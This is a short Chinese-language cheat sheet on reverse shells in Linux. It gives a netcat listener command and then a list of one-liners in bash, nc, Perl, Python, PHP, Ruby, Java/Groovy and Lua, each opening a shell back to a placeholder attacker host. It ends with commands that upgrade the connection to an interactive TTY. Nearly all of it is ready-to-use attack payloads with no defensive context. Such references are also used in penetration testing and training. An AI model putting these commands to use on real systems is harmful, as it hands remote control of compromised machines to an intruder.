# Linux环境中反弹shell
`@Time   : 2021/5/8 下午3:58`
`@Author : 852782749@qq.com`


```
开始编辑～
```
# 说明
```angular2html
主要涉及到nc的应用 

```

### 远程服务器开启端口监听
```angular2html
nc -l 12345
```
### 目标服务器linux反弹shell
```angular2html
nc your_ip your_port -e /bin/bash 

bash -I >& /dev/tcp/your_ip/your_port 0>&1


perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

nc -e /bin/sh 10.0.0.1 1234

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999

r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

### 获取shell窗口(交互式shell界面，可以根据目标环境中选择相应的命令)
```angular2html
script /dev/null

python -c 'import pty; pty.spawn("/bin/bash")' 

```


> 乾坤未定，你我皆是黑马